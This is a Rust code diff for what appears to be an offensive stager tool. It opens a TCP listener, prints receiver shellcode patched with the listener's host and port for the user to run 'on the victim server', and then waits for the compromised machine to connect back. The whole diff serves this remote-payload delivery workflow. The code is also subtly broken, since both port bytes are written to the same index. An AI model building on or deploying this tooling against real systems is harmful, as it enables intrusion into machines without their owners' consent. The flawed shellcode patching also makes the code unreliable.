@@ -2,7 +2,7 @@ use colored::Colorize;
 use syscalls::Sysno;
 use std::{error::Error, io::{self, Write}, net::TcpListener};
 
-use crate::{config::{Config, ScFmt}, util::{print_shellcode_quoted, print_shellcode_hex}, shellcode::{SYS_READ_RECEIVER, SYS_RECVFROM_RECEIVER}};
+use crate::{config::{Config, ScFmt}, util::{print_shellcode_quoted, print_shellcode_hex, print_info}, shellcode::{SYS_READ_RECEIVER, SYS_RECVFROM_RECEIVER}};
 use crate::util::{print_success, print_warning, print_error};
 
 fn help() {
@@ -30,7 +30,7 @@ fn option_help(config: &mut Config) {
         host          {:<16}Server host
         port          {:<16}Server port
         format        {:<16}Shellcode format
-        read_syscall  SYS_{:<12}Read syscall
+        read_syscall  {:<16}Read syscall
 
 
     Available Syscalls
@@ -58,9 +58,8 @@ fn run(config: &mut Config) -> Result<(), Box<dyn Error>> {
 
     let server_sock_addr = format!("{}:{}", config.server_host.to_string(), config.server_port);
     let listener = TcpListener::bind(&server_sock_addr)?;
-    let client_stream = listener.accept()?;
 
-    print_success("Run the following shellcode on the victim server:");
+    print_info("Run the following shellcode on the victim server:");
 
     let read_receiver = match config.open_syscall.sysno {
         Sysno::read => SYS_READ_RECEIVER,
@@ -75,13 +74,18 @@ fn run(config: &mut Config) -> Result<(), Box<dyn Error>> {
     read_shellcode[read_receiver.port_index] = (config.server_port & 0xff) as u8;
     read_shellcode[read_receiver.port_index] = ((config.server_port & 0xff00) >> 8) as u8;
     match config.sc_fmt {
-        ScFmt::ScFmtHex => print_shellcode_quoted(&read_shellcode),
-        ScFmt::ScFmtQuoted => print_shellcode_hex(&read_shellcode),
+        ScFmt::ScFmtQuoted => print_shellcode_quoted(&read_shellcode),
+        ScFmt::ScFmtHex => print_shellcode_hex(&read_shellcode),
         _ => print_shellcode_quoted(&read_shellcode),
     }
 
     let waiting_connecion_msg = format!("Waiting for connection on {}", &server_sock_addr);
-    print_success(&waiting_connecion_msg);
+    print_info(&waiting_connecion_msg);
+
+    let (client, client_addr) = listener.accept()?;
+    let client_sock_addr = client_addr.to_string();
+    let connection_established_msg = format!("Connection established from {}", &client_sock_addr);
+    print_success(&connection_established_msg);
 
     Ok(())
 }
